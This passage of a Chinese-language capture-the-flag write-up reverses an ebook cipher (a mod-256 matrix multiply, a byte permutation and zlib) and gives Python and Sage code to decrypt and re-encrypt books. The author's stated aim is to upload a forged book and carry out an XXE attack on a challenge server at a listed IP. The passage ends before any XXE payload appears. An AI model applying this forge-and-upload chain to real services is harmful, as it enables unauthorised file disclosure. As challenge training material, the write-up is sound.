class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      read_book(v14, v3, v13);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>发现其实就是解密 + zlib 解压缩, 然后小说本体保存形式是 xml, 用 libxml 来解析.</p><p>接下来逆向解密算法, 发现在 decrypt 里面调用了 decrypt_block, 实际上是分块密码, 每 16 字节分块解密, 而 decrypt_block 的实现如下  </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">15</span>; ++k )</span><br><span class="line">        v1 += Mminus[<span class="number">16</span> * k + j] * a1[k];</span><br><span class="line">      ptr[j] = v1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt;= <span class="number">15</span>; ++l )</span><br><span class="line">      a1[l] = ptr[(<span class="keyword">unsigned</span> __int8)Pminus[l]];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br></pre></td></tr></table></figure><p>转成 python 代码可能更容易看懂, 其中 Mminus 是大小 256 的数组, Pminus 是大小 16 的数组, </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_block</span><span class="params">(block)</span>:</span></span><br><span class="line">    block = bytearray(block)</span><br><span class="line">    ptr = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">            t = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">                t += Mminus[<span class="number">16</span> * k + j] * block[k]</span><br><span class="line">            ptr[j] = t % <span class="number">256</span></span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">            block[l] = ptr[Pminus[l]]</span><br><span class="line">    <span class="keyword">return</span> block</span><br></pre></td></tr></table></figure><p>学过线性代数可以看出, 其实就是算了个矩阵乘法, 然后置换一下, Mminus 就是个 16 * 16 的矩阵.</p><p>搞懂之后就可以写算法解密了, </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">Mminus = [</span><br><span class="line">    <span class="number">135</span>, <span class="number">25</span>, <span class="number">77</span>, <span class="number">128</span>, <span class="number">251</span>, <span class="number">9</span>, <span class="number">168</span>, <span class="number">169</span>, <span class="number">158</span>, <span class="number">82</span>, <span class="number">7</span>, <span class="number">213</span>, <span class="number">229</span>, <span class="number">180</span>, <span class="number">50</span>, <span class="number">53</span>, <span class="number">172</span>,</span><br><span class="line">    <span class="number">215</span>, <span class="number">32</span>, <span class="number">243</span>, <span class="number">113</span>, <span class="number">44</span>, <span class="number">134</span>, <span class="number">5</span>, <span class="number">22</span>, <span class="number">41</span>, <span class="number">89</span>, <span class="number">130</span>, <span class="number">171</span>, <span class="number">42</span>, <span class="number">81</span>, <span class="number">122</span>, <span class="number">38</span>, <span class="number">36</span>,</span><br><span class="line">    <span class="number">125</span>, <span class="number">25</span>, <span class="number">127</span>, <span class="number">38</span>, <span class="number">246</span>, <span class="number">241</span>, <span class="number">34</span>, <span class="number">33</span>, <span class="number">153</span>, <span class="number">238</span>, <span class="number">105</span>, <span class="number">228</span>, <span class="number">82</span>, <span class="number">86</span>, <span class="number">43</span>, <span class="number">81</span>,</span><br><span class="line">    <span class="number">161</span>, <span class="number">104</span>, <span class="number">26</span>, <span class="number">102</span>, <span class="number">238</span>, <span class="number">143</span>, <span class="number">134</span>, <span class="number">142</span>, <span class="number">221</span>, <span class="number">135</span>, <span class="number">141</span>, <span class="number">241</span>, <span class="number">71</span>, <span class="number">237</span>, <span class="number">153</span>,</span><br><span class="line">    <span class="number">159</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">231</span>, <span class="number">133</span>, <span class="number">139</span>, <span class="number">200</span>, <span class="number">78</span>, <span class="number">53</span>, <span class="number">197</span>, <span class="number">62</span>, <span class="number">167</span>, <span class="number">79</span>, <span class="number">221</span>, <span class="number">92</span>, <span class="number">164</span>,</span><br><span class="line">    <span class="number">120</span>, <span class="number">15</span>, <span class="number">48</span>, <span class="number">121</span>, <span class="number">90</span>, <span class="number">62</span>, <span class="number">163</span>, <span class="number">231</span>, <span class="number">118</span>, <span class="number">173</span>, <span class="number">36</span>, <span class="number">125</span>, <span class="number">92</span>, <span class="number">123</span>, <span class="number">165</span>, <span class="number">5</span>,</span><br><span class="line">    <span class="number">106</span>, <span class="number">129</span>, <span class="number">156</span>, <span class="number">145</span>, <span class="number">228</span>, <span class="number">50</span>, <span class="number">99</span>, <span class="number">209</span>, <span class="number">164</span>, <span class="number">50</span>, <span class="number">115</span>, <span class="number">230</span>, <span class="number">125</span>, <span class="number">17</span>, <span class="number">76</span>, <span class="number">208</span>,</span><br><span class="line">    <span class="number">67</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">246</span>, <span class="number">90</span>, <span class="number">54</span>, <span class="number">107</span>, <span class="number">115</span>, <span class="number">172</span>, <span class="number">92</span>, <span class="number">153</span>, <span class="number">102</span>, <span class="number">32</span>, <span class="number">1</span>, <span class="number">21</span>, <span class="number">80</span>, <span class="number">145</span>,</span><br><span class="line">    <span class="number">209</span>, <span class="number">176</span>, <span class="number">31</span>, <span class="number">250</span>, <span class="number">68</span>, <span class="number">90</span>, <span class="number">243</span>, <span class="number">94</span>, <span class="number">112</span>, <span class="number">161</span>, <span class="number">234</span>, <span class="number">223</span>, <span class="number">204</span>, <span class="number">79</span>, <span class="number">209</span>, <span class="number">222</span>,</span><br><span class="line">    <span class="number">16</span>, <span class="number">77</span>, <span class="number">188</span>, <span class="number">221</span>, <span class="number">125</span>, <span class="number">90</span>, <span class="number">112</span>, <span class="number">10</span>, <span class="number">80</span>, <span class="number">103</span>, <span class="number">77</span>, <span class="number">99</span>, <span class="number">139</span>, <span class="number">178</span>, <span class="number">137</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">192</span>, <span class="number">57</span>, <span class="number">24</span>, <span class="number">243</span>, <span class="number">125</span>, <span class="number">252</span>, <span class="number">140</span>, <span class="number">90</span>, <span class="number">250</span>, <span class="number">132</span>, <span class="number">220</span>, <span class="number">194</span>, <span class="number">154</span>, <span class="number">121</span>, <span class="number">114</span>, <span class="number">55</span>,</span><br><span class="line">    <span class="number">27</span>, <span class="number">129</span>, <span class="number">61</span>, <span class="number">196</span>, <span class="number">244</span>, <span class="number">42</span>, <span class="number">191</span>, <span class="number">242</span>, <span class="number">188</span>, <span class="number">254</span>, <span class="number">166</span>, <span class="number">59</span>, <span class="number">232</span>, <span class="number">94</span>, <span class="number">237</span>, <span class="number">209</span>,</span><br><span class="line">    <span class="number">192</span>, <span class="number">58</span>, <span class="number">47</span>, <span class="number">238</span>, <span class="number">147</span>, <span class="number">6</span>, <span class="number">244</span>, <span class="number">230</span>, <span class="number">134</span>, <span class="number">184</span>, <span class="number">235</span>, <span class="number">16</span>, <span class="number">53</span>, <span class="number">81</span>, <span class="number">121</span>, <span class="number">248</span>,</span><br><span class="line">    <span class="number">117</span>, <span class="number">158</span>, <span class="number">17</span>, <span class="number">87</span>, <span class="number">247</span>, <span class="number">205</span>, <span class="number">16</span>, <span class="number">129</span>, <span class="number">123</span>, <span class="number">255</span>, <span class="number">3</span>, <span class="number">89</span>, <span class="number">11</span>, <span class="number">98</span>, <span class="number">58</span>, <span class="number">125</span>, <span class="number">181</span>,</span><br><span class="line">    <span class="number">236</span>, <span class="number">40</span>, <span class="number">99</span>, <span class="number">141</span>, <span class="number">232</span>, <span class="number">115</span>, <span class="number">85</span>, <span class="number">100</span>, <span class="number">205</span>, <span class="number">190</span>, <span class="number">84</span>, <span class="number">226</span>, <span class="number">217</span>, <span class="number">214</span>, <span class="number">115</span>, <span class="number">62</span>,</span><br><span class="line">    <span class="number">216</span>, <span class="number">239</span>, <span class="number">44</span>, <span class="number">111</span>, <span class="number">69</span>, <span class="number">135</span>, <span class="number">142</span>, <span class="number">248</span>, <span class="number">240</span>, <span class="number">180</span>, <span class="number">157</span>, <span class="number">41</span>, <span class="number">105</span></span><br><span class="line">]</span><br><span class="line">Pminus = [</span><br><span class="line">    <span class="string">'\f'</span>, <span class="string">'\x0F'</span>, <span class="string">'\x0E'</span>, <span class="string">'\b'</span>, <span class="string">'\x03'</span>, <span class="string">'\v'</span>, <span class="string">'\r'</span>, <span class="string">'\0'</span>, <span class="string">'\a'</span>, <span class="string">'\t'</span>, <span class="string">'\n'</span>,</span><br><span class="line">    <span class="string">'\x06'</span>, <span class="string">'\x02'</span>, <span class="string">'\x01'</span>, <span class="string">'\x05'</span>, <span class="string">'\x04'</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> seq, c <span class="keyword">in</span> enumerate(Pminus):</span><br><span class="line">    Pminus[seq] = ord(c)</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'3ba9318b509034cb7b506df0faef4d80.fb2enc'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line"><span class="comment">#f = open('6506dad64d2353f25cca891f81443a8e.fb2enc', 'rb').read()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_block</span><span class="params">(block)</span>:</span></span><br><span class="line">    block = bytearray(block)</span><br><span class="line">    ptr = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">            t = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">                t += Mminus[<span class="number">16</span> * k + j] * block[k]</span><br><span class="line">            ptr[j] = t % <span class="number">256</span></span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">            block[l] = ptr[Pminus[l]]</span><br><span class="line">    <span class="keyword">return</span> block</span><br><span class="line"></span><br><span class="line">book = bytearray()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(f), <span class="number">16</span>):</span><br><span class="line">    book.extend(decrypt_block(f[i:i + <span class="number">16</span>]))</span><br><span class="line"></span><br><span class="line">dec = zlib.decompress(bytes(book))</span><br><span class="line">open(<span class="string">'output2.xml'</span>, <span class="string">'wb'</span>).write(dec)</span><br></pre></td></tr></table></figure><p>然后解密给的两本书, 发现里面真的就是两本小说 (<br>而且正文都是西里尔字母, 也看不懂 233</p><p>接下来的目标应该不是这两本小说, 再回到网站.<br>访问 robots.txt, 发现给了提示  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;authorszone</span><br></pre></td></tr></table></figure><p>在 <code>http://45.77.219.97/authorszone</code> 里面是上传书的地方, 而且只能上传加密过后的书.<br>再结合之前书的本体是 xml, 那么可以想到是 XXE 了.<br>接下来是写出加密算法, 实际上就是矩阵方程求解, 因为是 mod 256 整数环上的矩阵, 直接用 sage 来算了.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># This file was *autogenerated* from the file matrix.sage</span></span><br><span class="line"><span class="keyword">from</span> sage.all_cmdline <span class="keyword">import</span> *   <span class="comment"># import sage library</span></span><br><span class="line"></span><br><span class="line">_sage_const_256 = Integer(<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_solve</span><span class="params">(y)</span>:</span></span><br><span class="line">    mat = [[<span class="number">135</span>, <span class="number">172</span>, <span class="number">38</span>, <span class="number">43</span>, <span class="number">153</span>, <span class="number">164</span>, <span class="number">5</span>, <span class="number">208</span>, <span class="number">80</span>, <span class="number">209</span>, <span class="number">137</span>, <span class="number">114</span>, <span class="number">237</span>, <span class="number">121</span>, <span class="number">58</span>, <span class="number">214</span>], [<span class="number">25</span>, <span class="number">215</span>, <span class="number">36</span>, <span class="number">81</span>, <span class="number">159</span>, <span class="number">120</span>, <span class="number">106</span>, <span class="number">67</span>, <span class="number">145</span>, <span class="number">222</span>, <span class="number">128</span>, <span class="number">55</span>, <span class="number">209</span>, <span class="number">248</span>, <span class="number">125</span>, <span class="number">115</span>], [<span class="number">77</span>, <span class="number">32</span>, <span class="number">125</span>, <span class="number">161</span>, <span class="number">65</span>, <span class="number">15</span>, <span class="number">129</span>, <span class="number">38</span>, <span class="number">209</span>, <span class="number">16</span>, <span class="number">192</span>, <span class="number">27</span>, <span class="number">192</span>, <span class="number">117</span>, <span class="number">181</span>, <span class="number">62</span>], [<span class="number">128</span>, <span class="number">243</span>, <span class="number">25</span>, <span class="number">104</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">156</span>, <span class="number">0</span>, <span class="number">176</span>, <span class="number">77</span>, <span class="number">57</span>, <span class="number">129</span>, <span class="number">58</span>, <span class="number">158</span>, <span class="number">236</span>, <span class="number">216</span>], [<span class="number">251</span>, <span class="number">113</span>, <span class="number">127</span>, <span class="number">26</span>, <span class="number">231</span>, <span class="number">121</span>, <span class="number">145</span>, <span class="number">246</span>, <span class="number">31</span>, <span class="number">188</span>, <span class="number">24</span>, <span class="number">61</span>, <span class="number">47</span>, <span class="number">17</span>, <span class="number">40</span>, <span class="number">239</span>], [<span class="number">9</span>, <span class="number">44</span>, <span class="number">38</span>, <span class="number">102</span>, <span class="number">133</span>, <span class="number">90</span>, <span class="number">228</span>, <span class="number">90</span>, <span class="number">250</span>, <span class="number">221</span>, <span class="number">243</span>, <span class="number">196</span>, <span class="number">238</span>, <span class="number">87</span>, <span class="number">99</span>, <span class="number">44</span>], [<span class="number">168</span>, <span class="number">134</span>, <span class="number">246</span>, <span class="number">238</span>, <span class="number">139</span>, <span class="number">62</span>, <span class="number">50</span>, <span class="number">54</span>, <span class="number">68</span>, <span class="number">125</span>, <span class="number">125</span>, <span class="number">244</span>, <span class="number">147</span>, <span class="number">247</span>, <span class="number">141</span>, <span class="number">111</span>], [<span class="number">169</span>, <span class="number">5</span>, <span class="number">241</span>, <span class="number">143</span>, <span class="number">200</span>, <span class="number">163</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">90</span>, <span class="number">90</span>, <span class="number">252</span>, <span class="number">42</span>, <span class="number">6</span>, <span class="number">205</span>, <span class="number">232</span>, <span class="number">69</span>], [<span class="number">158</span>, <span class="number">22</span>, <span class="number">34</span>, <span class="number">134</span>, <span class="number">78</span>, <span class="number">231</span>, <span class="number">209</span>, <span class="number">115</span>, <span class="number">243</span>, <span class="number">112</span>, <span class="number">140</span>, <span class="number">191</span>, <span class="number">244</span>, <span class="number">16</span>, <span class="number">115</span>, <span class="number">135</span>], [<span class="number">82</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">142</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">164</span>, <span class="number">172</span>, <span class="number">94</span>, <span class="number">10</span>, <span class="number">90</span>, <span class="number">242</span>, <span class="number">230</span>, <span class="number">129</span>, <span class="number">85</span>, <span class="number">142</span>], [<span class="number">7</span>, <span class="number">89</span>, <span class="number">153</span>, <span class="number">221</span>, <span class="number">197</span>, <span class="number">173</span>, <span class="number">50</span>, <span class="number">92</span>, <span class="number">112</span>, <span class="number">80</span>, <span class="number">250</span>, <span class="number">188</span>, <span class="number">134</span>, <span class="number">123</span>, <span class="number">100</span>, <span class="number">248</span>], [<span class="number">213</span>, <span class="number">130</span>, <span class="number">238</span>, <span class="number">135</span>, <span class="number">62</span>, <span class="number">36</span>, <span class="number">115</span>, <span class="number">153</span>, <span class="number">161</span>, <span class="number">103</span>, <span class="number">132</span>, <span class="number">254</span>, <span class="number">184</span>, <span class="number">255</span>, <span class="number">205</span>, <span class="number">240</span>], [<span class="number">229</span>, <span class="number">171</span>, <span class="number">105</span>, <span class="number">141</span>, <span class="number">167</span>, <span class="number">125</span>, <span class="number">230</span>, <span class="number">102</span>, <span class="number">234</span>, <span class="number">77</span>, <span class="number">220</span>, <span class="number">166</span>, <span class="number">235</span>, <span class="number">3</span>, <span class="number">190</span>, <span class="number">180</span>], [<span class="number">180</span>, <span class="number">42</span>, <span class="number">228</span>, <span class="number">241</span>, <span class="number">79</span>, <span class="number">92</span>, <span class="number">125</span>, <span class="number">32</span>, <span class="number">223</span>, <span class="number">99</span>, <span class="number">194</span>, <span class="number">59</span>, <span class="number">16</span>, <span class="number">89</span>, <span class="number">84</span>, <span class="number">157</span>], [<span class="number">50</span>, <span class="number">81</span>, <span class="number">82</span>, <span class="number">71</span>, <span class="number">221</span>, <span class="number">123</span>, <span class="number">17</span>, <span class="number">1</span>, <span class="number">204</span>, <span class="number">139</span>, <span class="number">154</span>, <span class="number">232</span>, <span class="number">53</span>, <span class="number">11</span>, <span class="number">226</span>, <span class="number">41</span>], [<span class="number">53</span>, <span class="number">122</span>, <span class="number">86</span>, <span class="number">237</span>, <span class="number">92</span>, <span class="number">165</span>, <span class="number">76</span>, <span class="number">21</span>, <span class="number">79</span>, <span class="number">178</span>, <span class="number">121</span>, <span class="number">94</span>, <span class="number">81</span>, <span class="number">98</span>, <span class="number">217</span>, <span class="number">105</span>]]</span><br><span class="line">    R = IntegerModRing(_sage_const_256 )</span><br><span class="line">    y = vector(R, y)</span><br><span class="line">    mat = matrix(R, mat)</span><br><span class="line">    ret = mat.solve_right(y)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mminus = [</span><br><span class="line">    <span class="number">135</span>, <span class="number">25</span>, <span class="number">77</span>, <span class="number">128</span>, <span class="number">251</span>, <span class="number">9</span>, <span class="number">168</span>, <span class="number">169</span>, <span class="number">158</span>, <span class="number">82</span>, <span class="number">7</span>, <span class="number">213</span>, <span class="number">229</span>, <span class="number">180</span>, <span class="number">50</span>, <span class="number">53</span>, <span class="number">172</span>,</span><br><span class="line">    <span class="number">215</span>, <span class="number">32</span>, <span class="number">243</span>, <span class="number">113</span>, <span class="number">44</span>, <span class="number">134</span>, <span class="number">5</span>, <span class="number">22</span>, <span class="number">41</span>, <span class="number">89</span>, <span class="number">130</span>, <span class="number">171</span>, <span class="number">42</span>, <span class="number">81</span>, <span class="number">122</span>, <span class="number">38</span>, <span class="number">36</span>,</span><br><span class="line">    <span class="number">125</span>, <span class="number">25</span>, <span class="number">127</span>, <span class="number">38</span>, <span class="number">246</span>, <span class="number">241</span>, <span class="number">34</span>, <span class="number">33</span>, <span class="number">153</span>, <span class="number">238</span>, <span class="number">105</span>, <span class="number">228</span>, <span class="number">82</span>, <span class="number">86</span>, <span class="number">43</span>, <span class="number">81</span>,</span><br><span class="line">    <span class="number">161</span>, <span class="number">104</span>, <span class="number">26</span>, <span class="number">102</span>, <span class="number">238</span>, <span class="number">143</span>, <span class="number">134</span>, <span class="number">142</span>, <span class="number">221</span>, <span class="number">135</span>, <span class="number">141</span>, <span class="number">241</span>, <span class="number">71</span>, <span class="number">237</span>, <span class="number">153</span>,</span><br><span class="line">    <span class="number">159</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">231</span>, <span class="number">133</span>, <span class="number">139</span>, <span class="number">200</span>, <span class="number">78</span>, <span class="number">53</span>, <span class="number">197</span>, <span class="number">62</span>, <span class="number">167</span>, <span class="number">79</span>, <span class="number">221</span>, <span class="number">92</span>, <span class="number">164</span>,</span><br><span class="line">    <span class="number">120</span>, <span class="number">15</span>, <span class="number">48</span>, <span class="number">121</span>, <span class="number">90</span>, <span class="number">62</span>, <span class="number">163</span>, <span class="number">231</span>, <span class="number">118</span>, <span class="number">173</span>, <span class="number">36</span>, <span class="number">125</span>, <span class="number">92</span>, <span class="number">123</span>, <span class="number">165</span>, <span class="number">5</span>,</span><br><span class="line">    <span class="number">106</span>, <span class="number">129</span>, <span class="number">156</span>, <span class="number">145</span>, <span class="number">228</span>, <span class="number">50</span>, <span class="number">99</span>, <span class="number">209</span>, <span class="number">164</span>, <span class="number">50</span>, <span class="number">115</span>, <span class="number">230</span>, <span class="number">125</span>, <span class="number">17</span>, <span class="number">76</span>, <span class="number">208</span>,</span><br><span class="line">    <span class="number">67</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">246</span>, <span class="number">90</span>, <span class="number">54</span>, <span class="number">107</span>, <span class="number">115</span>, <span class="number">172</span>, <span class="number">92</span>, <span class="number">153</span>, <span class="number">102</span>, <span class="number">32</span>, <span class="number">1</span>, <span class="number">21</span>, <span class="number">80</span>, <span class="number">145</span>,</span><br><span class="line">    <span class="number">209</span>, <span class="number">176</span>, <span class="number">31</span>, <span class="number">250</span>, <span class="number">68</span>, <span class="number">90</span>, <span class="number">243</span>, <span class="number">94</span>, <span class="number">112</span>, <span class="number">161</span>, <span class="number">234</span>, <span class="number">223</span>, <span class="number">204</span>, <span class="number">79</span>, <span class="number">209</span>, <span class="number">222</span>,</span><br><span class="line">    <span class="number">16</span>, <span class="number">77</span>, <span class="number">188</span>, <span class="number">221</span>, <span class="number">125</span>, <span class="number">90</span>, <span class="number">112</span>, <span class="number">10</span>, <span class="number">80</span>, <span class="number">103</span>, <span class="number">77</span>, <span class="number">99</span>, <span class="number">139</span>, <span class="number">178</span>, <span class="number">137</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">192</span>, <span class="number">57</span>, <span class="number">24</span>, <span class="number">243</span>, <span class="number">125</span>, <span class="number">252</span>, <span class="number">140</span>, <span class="number">90</span>, <span class="number">250</span>, <span class="number">132</span>, <span class="number">220</span>, <span class="number">194</span>, <span class="number">154</span>, <span class="number">121</span>, <span class="number">114</span>, <span class="number">55</span>,</span><br><span class="line">    <span class="number">27</span>, <span class="number">129</span>, <span class="number">61</span>, <span class="number">196</span>, <span class="number">244</span>, <span class="number">42</span>, <span class="number">191</span>, <span class="number">242</span>, <span class="number">188</span>, <span class="number">254</span>, <span class="number">166</span>, <span class="number">59</span>, <span class="number">232</span>, <span class="number">94</span>, <span class="number">237</span>, <span class="number">209</span>,</span><br><span class="line">    <span class="number">192</span>, <span class="number">58</span>, <span class="number">47</span>, <span class="number">238</span>, <span class="number">147</span>, <span class="number">6</span>, <span class="number">244</span>, <span class="number">230</span>, <span class="number">134</span>, <span class="number">184</span>, <span class="number">235</span>, <span class="number">16</span>, <span class="number">53</span>, <span class="number">81</span>, <span class="number">121</span>, <span class="number">248</span>,</span><br><span class="line">    <span class="number">117</span>, <span class="number">158</span>, <span class="number">17</span>, <span class="number">87</span>, <span class="number">247</span>, <span class="number">205</span>, <span class="number">16</span>, <span class="number">129</span>, <span class="number">123</span>, <span class="number">255</span>, <span class="number">3</span>, <span class="number">89</span>, <span class="number">11</span>, <span class="number">98</span>, <span class="number">58</span>, <span class="number">125</span>, <span class="number">181</span>,</span><br><span class="line">    <span class="number">236</span>, <span class="number">40</span>, <span class="number">99</span>, <span class="number">141</span>, <span class="number">232</span>, <span class="number">115</span>, <span class="number">85</span>, <span class="number">100</span>, <span class="number">205</span>, <span class="number">190</span>, <span class="number">84</span>, <span class="number">226</span>, <span class="number">217</span>, <span class="number">214</span>, <span class="number">115</span>, <span class="number">62</span>,</span><br><span class="line">    <span class="number">216</span>, <span class="number">239</span>, <span class="number">44</span>, <span class="number">111</span>, <span class="number">69</span>, <span class="number">135</span>, <span class="number">142</span>, <span class="number">248</span>, <span class="number">240</span>, <span class="number">180</span>, <span class="number">157</span>, <span class="number">41</span>, <span class="number">105</span></span><br><span class="line">]</span><br><span class="line">Pminus = [</span><br><span class="line">    <span class="string">'\f'</span>, <span class="string">'\x0F'</span>, <span class="string">'\x0E'</span>, <span class="string">'\b'</span>, <span class="string">'\x03'</span>, <span class="string">'\v'</span>, <span class="string">'\r'</span>, <span class="string">'\0'</span>, <span class="string">'\a'</span>, <span class="string">'\t'</span>, <span class="string">'\n'</span>,</span><br><span class="line">    <span class="string">'\x06'</span>, <span class="string">'\x02'</span>, <span class="string">'\x01'</span>, <span class="string">'\x05'</span>, <span class="string">'\x04'</span></span><br><span class="line">]</span><br><span class="line">rPminus = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> seq, c <span class="keyword">in</span> enumerate(Pminus):</span><br><span class="line">    Pminus[seq] = ord(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    rPminus.append(Pminus.index(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_block</span><span class="params">(block)</span>:</span></span><br><span class="line">    block = bytearray(block)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        tmp = bytearray([<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)])</span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">            tmp[l] = block[rPminus[l]]</span><br><span class="line">        block = tmp</span><br><span class="line">        block = get_solve(list(block))</span><br><span class="line">    <span class="keyword">return</span> bytearray(block)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(data)</span>:</span></span><br><span class="line">    data = zlib.compress(data)</span><br><span class="line">    data = bytearray(data)</span><br><span class="line">    pad = <span class="number">16</span> - len(data) % <span class="number">16</span></span><br><span class="line">    data.extend([pad <span class="keyword">for</span> _ <span class="keyword">in</span> range(pad)])</span><br><span class="line">    </span><br><span 